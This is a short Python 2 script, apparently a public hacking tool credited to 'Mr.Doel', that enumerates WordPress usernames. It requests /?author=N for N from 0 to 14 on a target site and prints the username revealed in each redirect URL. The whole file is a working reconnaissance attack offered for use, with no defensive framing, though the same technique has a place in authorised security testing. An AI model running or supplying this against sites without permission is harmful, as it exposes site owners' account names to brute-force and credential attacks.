#!/usr/bin/python
#WP User Enum
#Author     : Mr.Doel
#E-email    : doel@indonesiancoder.com
import urllib2,sys
url=sys.argv[1]
for num in range(15):
    try:
        response = urllib2.urlopen(url + "/?author=%s" % (num))
        geturi=str(response.geturl())
        print geturi.split("/author",1)[1].replace("/",'').lstrip()
    except Exception, e:
        pass
